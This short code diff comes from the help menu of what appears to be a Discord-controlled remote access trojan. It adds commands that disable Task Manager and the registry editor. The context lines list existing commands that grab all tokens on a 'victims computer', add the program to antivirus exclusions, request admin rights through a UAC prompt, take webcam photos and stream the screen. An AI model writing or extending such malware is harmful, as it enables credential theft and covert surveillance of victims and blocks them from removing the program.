@@ -912,6 +912,8 @@ async def help_command(ctx):
         {"name": f"{PREFIX}grabtoken", "value": "Grabs all tokens on victims computer"},
         {"name": f"{PREFIX}disableav", "value": "Doesnt Disable AV but adds itself to exclusions if it has admin"},
         {"name": f"{PREFIX}getadmin", "value": "Pops up with a UAC prompt and if accepted you get admin"},
+        {"name": f"{PREFIX}disabletaskmanager", "value": "Disables taskmanager"},
+        {"name": f"{PREFIX}disableregedit", "value": "Disables regedit"},
         {"name": f"{PREFIX}webcam", "value": "Takes a photo using the system's webcam and sends it to the channel"},
         {"name": f"{PREFIX}screen [duration]", "value": "Provides a live view of the screen, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)"},
         {"name": f"{PREFIX}stopscreen", "value": "Stops the live screen view"},
